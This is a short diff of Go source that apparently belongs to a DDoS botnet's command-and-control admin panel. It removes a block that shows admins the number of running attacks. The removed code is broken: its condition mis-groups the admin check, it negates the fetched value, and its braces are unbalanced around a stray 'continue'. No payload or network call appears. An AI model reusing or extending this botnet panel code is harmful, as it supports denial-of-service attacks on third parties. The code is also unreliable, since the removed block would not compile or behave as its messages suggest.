@@ -232,13 +232,6 @@ func (this *Admin) Handle() {
 			continue
 		}
 
-		if userInfo.admin == 1 && cmd == "ongoing" || cmd == "running" || cmd == "Ragnarok" {
-			godsdisciples = !database.fetchRunningAttacks()
-			this.conn.Write([]byte(fmt.Sprintf("\033[1;36mRunning Attacks\033[1;35m: \033[1;36m %v\033[1;37m\r\n", godsdisciples)))
-		}
-			continue
-		}
-
 		if cmd == "" {
 			continue
 		}
